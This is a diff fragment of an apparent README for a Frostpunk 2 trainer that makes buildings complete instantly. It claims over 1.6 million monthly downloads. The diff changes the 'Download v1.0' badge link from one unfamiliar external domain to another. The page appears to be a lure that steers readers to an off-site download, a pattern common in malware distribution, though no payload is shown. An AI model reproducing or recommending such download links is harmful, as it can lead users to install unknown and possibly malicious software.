@@ -70,7 +70,7 @@ A: Yes — buildings complete instantly.
 
 **Monthly downloads:** 1.6m+
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/frostpunk2tr)
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/frostpunk2tr)
 
 ---
 
